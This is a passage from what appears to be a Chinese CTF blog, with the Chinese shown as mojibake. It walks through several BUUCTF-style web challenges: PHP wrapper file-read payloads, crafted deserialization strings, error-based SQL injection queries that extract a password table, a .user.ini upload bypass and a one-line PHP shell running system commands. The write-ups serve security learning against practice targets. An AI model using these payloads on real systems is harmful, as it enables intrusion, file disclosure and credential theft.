class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$s2</span>))===<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$s3</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>æ‰“å¼€é¢˜ç›®è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadè¯»å–<code>useless.php</code>æ–‡ä»¶å†…å®¹</p><blockquote><p><strong>php:&#x2F;&#x2F;input</strong> ï¼š&#x2F;?text&#x3D;php:&#x2F;&#x2F;inputï¼Œç„¶åä½¿ç”¨bpè¿›è¡Œpostä¼ é€’è¦è¯»å–çš„å†…å®¹</p><p><strong>php:&#x2F;&#x2F;filter</strong> ï¼šfile&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p><strong>data:&#x2F;&#x2F;</strong> ï¼š?text&#x3D;data:text&#x2F;plain,welcome to the zjctf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>æ„é€ payloadè¾“å…¥åæŸ¥çœ‹æºç å³å¯è·å–flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?text=data:text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>ç©ºæ ¼å’Œ&#x3D;å·æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨ï¼ˆï¼‰æ¥ä»£æ›¿ç©ºæ ¼ï¼Œä½¿ç”¨likeæ¥ä»£æ›¿&#x3D;å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#å¾—åˆ°æ•°æ®åº“geek</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23</span><br><span class="line">#å¾—åˆ°æ•°æ®è¡¨H4rDsq1</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#x27;geek&#x27;)))))%23</span><br><span class="line">#å¾—åˆ°å­—æ®µid,username,password</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;)))))%23</span><br><span class="line">#è·å–passwordå­—æ®µå†…å®¹</span><br><span class="line">#å·¦åŠæ®µ</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</span><br><span class="line">#å³åŠæ®µ</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23</span><br><span class="line">#ä¸¤è¾¹æ‹¼æ¥å¹¶ä¸”å»æ‰é‡å¤å†…å®¹å³å¯å¾—åˆ°flag</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>é‡‡ç”¨<code>.htaccessç»•è¿‡</code>å³å¯ï¼Œå‚è€ƒæœ¬äººåšå®¢<a href="https://www.evo1ution.cn/2022/05/27/upload-labs/">upload-labs</a>ä¸­<code>pass-04</code>å³å¯ä¸Šä¼ æˆåŠŸã€‚ä¸Šä¼ åç”¨èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å³å¯æ‰¾åˆ°flagã€‚</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>ä¼ æ–‡ä»¶å°è¯•å‘ç°æŠ¥é”™æœ‰<code>exif_imagetype:not image!</code>ï¼Œæ•…éœ€è¦ä¿®æ”¹æ–‡ä»¶å¤´ã€‚</p><p>å°è¯•åå‘ç°è¦ä½¿ç”¨<code>.user.ini</code>æ¥ç»•è¿‡ï¼Œæ–‡ä»¶å†…å®¹ä¸º</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰</p></blockquote><p>å°è¯•åå‘ç°è¿˜æœ‰æŠ¥é”™<code>&lt;? in contents!</code>ï¼Œæ•…ä½¿ç”¨è¯¥ä¸€å¥è¯æœ¨ğŸï¼ˆæ³¨æ„æ–‡ä»¶åè¦ä¸<code>.user.ini</code>ä¸­ä¸€è‡´ï¼Œæ­¤å¤„ä¸º<code>1.jpg</code>ï¼‰</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="title function_">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆä¸Šä¼ <code>.user.ini</code>å†ä¸Šä¼ <code>1.jpg</code>ï¼Œæœ€åè®¿é—®å›¾ç‰‡æ‰€åœ¨ä¸Šä¼ ç›®å½•çš„<code>index.php</code>æ–‡ä»¶å³å¯å¾—åˆ°flagã€‚</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>æ‰“å¼€ç½‘é¡µå‘ç°æºç åŠæç¤º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p><img src="https://img.gejiba.com/images/428809e1acbf3710ab8f0c628ba88378.png" alt="428809e1acbf3710ab8f0c628ba88378.png"></p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><p>æ‰“å¼€ç½‘é¡µå‘ç°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//æ–‡ä»¶åŒ…å«ï¼Œæ³¨æ„ä½¿ç”¨php://filterä¼ªåè®®è¯»å–æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//å¼±æ¯”è¾ƒ</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>php7.1+çš„æ–°ç‰¹æ€§ï¼Œå¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†protectedå±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">//echo urlencode(serialize($a)).PHP_EOL;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>æ„é€ ä¸€ä¸ªpayloadå»æ‰§è¡Œread()å‡½æ•°ï¼Œè¯»å–flag.phpçš„å†…å®¹ã€‚</p><blockquote><p>ï¼ˆ1ï¼‰op,filename,contentä¸‰ä¸ªå˜é‡æƒé™éƒ½æ˜¯<code>protected</code>ï¼Œè€Œprotectedæƒé™çš„å˜é‡åœ¨åºåˆ—åŒ–çš„æ—¶ä¼šæœ‰<code>%00*%00</code>å­—ç¬¦ï¼Œ<code>%00</code>å­—ç¬¦çš„ASCIIç ä¸º0ï¼Œå°±æ— æ³•é€šè¿‡ä¸Šé¢çš„<code>is_valid</code>å‡½æ•°æ ¡éªŒã€‚åˆ©ç”¨å¤§å†™Sé‡‡ç”¨çš„16è¿›åˆ¶ï¼Œæ¥ç»•è¿‡<code>is_valid</code>ä¸­å¯¹ç©ºå­—èŠ‚çš„æ£€æŸ¥ã€‚ä½¿ç”¨ <code>//00 </code>æ›¿æ¢ <code>%00</code> ã€‚</p><p>ï¼ˆ2ï¼‰å¼ºæ¯”è¾ƒå’Œå¼±æ¯”è¾ƒçš„åˆ©ç”¨ã€‚å°†opè®¾ç½®ä¸ºintå‹çš„2ï¼Œop &#x3D;&#x3D;&#x3D; â€œ2â€ä¸ºfalseï¼Œop &#x3D;&#x3D; â€œ2â€ä¸ºtrue,ç»•è¿‡ææ„å‡½æ•°ä¸­çš„ifåˆ¤æ–­ï¼ŒåŒæ—¶åˆå¯ä»¥è°ƒç”¨åˆ°è¯»æ–‡ä»¶çš„æµç¨‹ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_52653109/article/details/124016115">Buuctf[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\00&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://img.gejiba.com/images/a875cdabaadd2a490bcb0e2ec50279cb.png" alt="a875cdabaadd2a490bcb0e2ec50279cb.png"></p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>æŠ“åŒ…å‘ç°æœ‰è¢«æ³¨é‡Šçš„ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure><p>å…ˆç”¨<code>base32</code>è§£ç ï¼Œå†ç”¨<code>base64</code>è§£ç å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = 